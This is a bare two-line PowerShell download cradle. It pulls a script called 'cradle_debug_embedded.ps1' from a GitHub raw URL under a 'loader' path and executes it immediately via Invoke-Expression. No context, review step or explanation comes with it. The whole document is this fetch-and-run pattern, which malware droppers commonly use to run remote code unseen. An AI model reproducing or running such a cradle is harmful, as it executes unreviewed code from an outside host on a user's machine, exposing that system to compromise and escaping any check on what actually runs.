$s=(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/vilua-dot/hitbox-trigger/claude/busy-fermi-913pdn/loader/cradle_debug_embedded.ps1")
Invoke-Expression $s
